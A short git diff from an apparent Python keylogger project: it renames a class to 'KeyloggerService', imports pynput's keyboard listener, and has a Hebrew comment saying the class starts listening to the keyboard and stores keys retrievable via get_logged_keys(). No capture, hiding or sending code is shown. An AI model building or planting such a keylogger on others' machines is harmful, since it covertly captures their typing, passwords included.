@@ -2,7 +2,7 @@ import time
 from pynput.keyboard import Listener
 from iKeyLogger import IKeyLogger
 
-class Service(IKeyLogger):
+class KeyloggerService(IKeyLogger):
     # בעת יצירת מופע יוצר אוטומטית מערך ריק, מאזין למקלדת, ובודק לפעולות בפונקציה get_logged_keys()
     def __init__(self):
         self.list = []
